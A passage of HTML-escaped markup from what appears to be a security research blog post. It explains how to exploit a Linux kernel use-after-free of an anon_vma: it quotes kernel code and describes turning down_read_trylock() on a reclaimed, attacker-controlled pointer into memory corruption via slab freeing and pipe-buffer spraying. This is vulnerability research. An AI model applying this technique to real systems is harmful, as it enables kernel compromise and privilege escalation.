pre-wrap;\"&gt;// true&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma = NULL;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rwc-&amp;gt;contended = true;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;goto out;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;out:&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcu_read_unlock();&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return &lt;/span&gt;&lt;span style=\"background-color: cyan; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt; // return dangling pointer&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;One potential exploit technique is to let the function return the dangling &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; pointer and try to make the subsequent operations do something useful. Instead, we chose to use the &lt;/span&gt;&lt;span style=\"background-color: #ea9999; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;down_read_trylock()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call within the function to corrupt memory at a chosen address, which we can do if we can control the &lt;/span&gt;&lt;span style=\"background-color: #f9cb9c; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;root_anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; pointer that is read from the freed &lt;/span&gt;&lt;span style=\"background-color: cyan; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Controlling the &lt;/span&gt;&lt;span style=\"background-color: #f9cb9c; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;root_anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; pointer means reclaiming the freed &lt;/span&gt;&lt;span style=\"background-color: cyan; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; with attacker-controlled memory. &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; structures are allocated from their own kmalloc cache, which means we cannot simply free one and reclaim it with a different object. Instead we cause the associated &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; slab page to be returned back to the kernel page allocator by following a very similar strategy to the one documented &lt;/span&gt;&lt;a href=\"https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;here&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. By freeing all the &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; objects on a slab page, then flushing the percpu slab page partial freelist, we can cause the virtual memory previously associated with the &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; to be returned back to the page allocator. We then spray pipe buffers in order to reclaim the freed &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; with attacker controlled memory.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;At this point, we’ve discussed how to turn our use-after-free into a &lt;/span&gt;&lt;span style=\"background-color: #ea9999; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;down_read_trylock()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call on an attacker-controlled pointer. The implementation of &lt;/span&gt;&lt;span style=\"background-color: #ea9999; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;down_read_trylock()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is as follows:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rw_semaphore&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;atomic_long_t&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;count&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;atomic_long_t&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;owner&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;optimistic_spin_queue&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;osq&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/*&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;spinner&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;MCS&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;lock&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;*/&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;raw_spinlock_t&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;wait_lock&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;list_head&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;wait_list&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;static&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;inline&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;int&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;__down_read_trylock&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rw_semaphore&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;*&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; 